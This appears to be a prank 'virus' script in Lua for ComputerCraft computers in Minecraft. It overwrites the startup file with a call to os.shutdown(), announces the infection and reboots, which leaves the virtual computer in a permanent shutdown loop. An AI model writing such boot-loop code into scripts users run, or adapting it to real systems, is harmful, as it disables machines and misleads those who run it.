local shutdownLoop = [[
term.setCursorPos(1, 1)
os.shutdown()
]]

-- Edit startup.lua
local file = fs.open("startup", "w")
file.write(shutdownLoop)
file.close()
term.clear()
print("you've been infected shutdown loop, your pc is gonna restart in 3 seconds and its going to be in shutdown loop. craft a new pc")
sleep(3)
os.reboot()
